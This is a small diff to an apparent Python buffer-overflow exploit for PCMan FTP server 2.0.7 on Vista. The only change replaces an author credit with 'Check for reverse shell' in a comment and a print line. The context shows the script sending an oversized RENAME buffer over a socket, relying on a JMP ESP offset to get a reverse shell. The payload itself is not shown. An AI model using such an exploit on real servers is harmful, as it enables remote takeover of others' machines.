@@ -9,7 +9,7 @@ port= 21
 #
 #[*]Buffer Sent[*]
 #
-#This shell has been brought to you by Gr1zz1y
+#Check for reverse shell
 
 #PCMan FTP server 2.0.7 // Tested on Vista Ultimate x86
 #Offset is JMP ESP instruction in the actual program
@@ -77,4 +77,4 @@ s.recv(1024)
 s.send("RENAME " + buffer + " test.txt\r\n")
 print "[*]Buffer Sent[*]\r\n"
 s.close()
-print "This shell has been brought to you by Gr1zz1y"
+print "Check for reverse shell"
